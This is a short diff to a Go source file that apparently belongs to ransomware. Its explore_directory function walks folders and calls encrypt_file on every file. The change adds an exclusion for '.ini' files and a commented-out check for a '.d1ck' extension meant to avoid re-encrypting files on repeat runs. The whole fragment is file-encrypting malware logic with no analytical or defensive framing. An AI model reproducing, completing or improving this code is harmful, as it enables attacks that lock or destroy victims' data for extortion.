@@ -142,6 +142,10 @@ func explore_directory(parent_dir string) {
 			// other directories
 			// fmt.Println("Exploring directory:", file_path)
 		} else { // it's a file
+			//if strings.HasSuffix(file_path, ".d1ck") { } // already encrypted (in case the code is executed 2 or more times)
+			if strings.HasSuffix(file_path, ".ini") { // if .ini don't do anything
+				return nil
+			}
 			encrypt_file(file_path)
 		}
 		return nil
